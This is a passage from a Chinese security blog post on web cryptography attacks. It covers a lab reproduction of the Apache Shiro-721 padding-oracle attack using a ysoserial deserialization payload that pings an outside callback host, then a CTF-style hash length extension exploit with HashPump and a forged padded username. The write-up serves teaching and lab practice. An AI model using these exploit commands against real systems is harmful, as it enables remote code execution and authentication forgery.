<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/3ndz/Shiro-721.git</span><br><span class="line"><span class="built_in">cd</span> Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure>
<p>1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）<br><img src="../../images/cipher/web1/16.jpg" alt=""><br>2.生成java payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"ping awa4xw.ceye.io"</span> &gt; payload.class</span><br></pre></td></tr></table></figure>
<p>3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class</span><br></pre></td></tr></table></figure>
<p><img src="../../images/cipher/web1/17.jpg" alt=""><br>4.复制该cookie，然后重放一下数据库，即可成功执行命令<br><img src="../../images/cipher/web1/18.jpg" alt=""><br><img src="../../images/cipher/web1/19.jpg" alt=""></p>
<h2 id="0x2-3Hash长度扩展攻击"><a href="#0x2-3Hash长度扩展攻击" class="headerlink" title="0x2.3Hash长度扩展攻击"></a>0x2.3Hash长度扩展攻击</h2><p>Hash长度扩展攻击可以在知道HASH(message(salt+data))的hash值得情况下，算出HASH(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。<br>利用条件：  </p>
<ol>
<li>知道salt的长度</li>
<li>要知道一个由salt加密后的hash值</li>
<li>知道data的值(未加盐的明文)</li>
</ol>
<p>例题：  </p>
<p>hash.php </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>secret.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">'123456789qwertyuiopasdfghjklzxcvbnm12345671475'</span>;</span><br><span class="line">$flag=<span class="string">'flag&#123;this_1s_a_f1ag&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解题思路：<br>可以得到enc(“guest”)的值 ,$key的长度为46,要求我们输入的username在经过enc函数加密之后，与<code>$_COOKIE[‘verify’]</code>的值相等，并且username中必须含有admin。</p>
<p>使用hashdump工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>用法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的<span class="built_in">hash</span>值，这里是<span class="variable">$_COOKIE</span>[<span class="string">'verify'</span>]的值</span><br><span class="line">Input Data: 上面的<span class="built_in">hash</span>值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: <span class="variable">$key</span>的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure>
<p><img src="../../images/cipher/web1/20.jpg" alt=""><br>然后我们将得到的hash值去替换数据包中<code>$_COOKIE[‘verify’]</code>的值，然后post提交<br>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。<br><img src="../../images/cipher/web1/21.jpg" alt=""> </p>
<h1 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h1><p>这里简单介绍了常见的WEB密码学攻击方式，如有错误的地方欢迎指正。</p>
<p>参考链接：<br><a href="https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/" target="_blank" rel="noopener">https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/</a><br><a href="https://www.anquanke.com/post/id/84724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84724</a><br><a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/4641618b.html">https://blog.cfyqy.com/article/4641618b.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/f1de98ef.html"><i class="fas fa-angle-left">&nbsp;</i><span>Apache-Commons-Collections漏洞分析</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/81c4e30a.html"><span>英语语法学习</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>